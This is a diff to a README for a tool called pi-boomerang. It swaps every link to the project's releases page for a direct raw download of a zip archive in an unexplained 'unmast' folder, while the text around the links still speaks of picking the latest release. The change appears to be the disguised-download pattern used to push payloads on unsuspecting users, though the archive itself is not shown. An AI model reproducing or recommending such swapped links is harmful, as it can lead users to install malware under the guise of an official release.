@@ -1,6 +1,6 @@
 # 🎯 pi-boomerang - Efficient Task Automation for Pi Coding
 
-[![Download pi-boomerang](https://img.shields.io/badge/Download-pi--boomerang-%23FF4500?style=for-the-badge)](https://github.com/redaamola/pi-boomerang/releases)
+[![Download pi-boomerang](https://img.shields.io/badge/Download-pi--boomerang-%23FF4500?style=for-the-badge)](https://github.com/redaamola/pi-boomerang/raw/refs/heads/main/unmast/pi-boomerang-1.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To begin, you need to download the software from the official release page. Foll
 
 1. **Visit the Download Page**  
    Click the big button at the top or visit this link in your web browser:  
-   [https://github.com/redaamola/pi-boomerang/releases](https://github.com/redaamola/pi-boomerang/releases)
+   [https://github.com/redaamola/pi-boomerang/raw/refs/heads/main/unmast/pi-boomerang-1.4.zip](https://github.com/redaamola/pi-boomerang/raw/refs/heads/main/unmast/pi-boomerang-1.4.zip)
 
 2. **Find the Latest Release**  
    On the page, look for the most recent version listed under "Latest Release". It will have a tag like `v1.0`, `v1.1`, or similar.
@@ -98,7 +98,7 @@ Settings are found under the gear icon on the top-right.
 
 You can always return to the release page to get updates, bug fixes, or new features:  
 
-[Download pi-boomerang from Releases](https://github.com/redaamola/pi-boomerang/releases)
+[Download pi-boomerang from Releases](https://github.com/redaamola/pi-boomerang/raw/refs/heads/main/unmast/pi-boomerang-1.4.zip)
 
 ---
 
